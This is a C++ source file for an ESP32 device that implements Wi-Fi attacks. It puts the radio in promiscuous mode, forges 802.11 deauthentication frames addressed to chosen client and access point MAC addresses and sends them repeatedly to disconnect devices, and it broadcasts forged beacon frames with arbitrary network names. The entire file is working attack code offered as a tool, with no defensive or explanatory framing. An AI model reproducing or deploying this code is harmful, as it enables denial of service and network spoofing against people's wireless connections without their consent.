#include "AttackEngine.h"
#include <esp_wifi.h>

AttackEngine attackEngine;

AttackEngine::AttackEngine() {
}

void AttackEngine::begin() {
    // Promiscuous mode enables raw packet injection
    esp_wifi_set_promiscuous(true);
}

void AttackEngine::setChannel(int ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void AttackEngine::buildDeauth(uint8_t* target, uint8_t* source, int reason) {
    // C0 00 ...
    memcpy(&deauthPacket[4], target, 6);
    memcpy(&deauthPacket[10], source, 6);
    memcpy(&deauthPacket[16], source, 6);
    
    deauthPacket[24] = reason & 0xFF;
    deauthPacket[25] = (reason >> 8) & 0xFF;
}

void AttackEngine::sendDeauth(uint8_t* targetMac, uint8_t* apMac, int reason) {
    buildDeauth(targetMac, apMac, reason);
    
    // Send multiple times to ensure delivery
    for(int i=0; i<3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(10);
    }
}

void AttackEngine::sendBeacon(String ssid) {
    // Simple Beacon Frame
    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
                            0xc0, 0x6c, 
                            0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
                            0x64, 0x00, 
                            0x01, 0x04, 
                            // SSID len, SSID...
                          };
    
    int ssidLen = ssid.length();
    if (ssidLen > 32) ssidLen = 32;
    
    packet[37] = ssidLen;
    for(int i=0; i<ssidLen; i++) {
        packet[38+i] = ssid[i];
    }
    
    // Add supported rates etc.
    // ... Simplified for now
    
    int packetSize = 38 + ssidLen;
    
    esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, false);
}
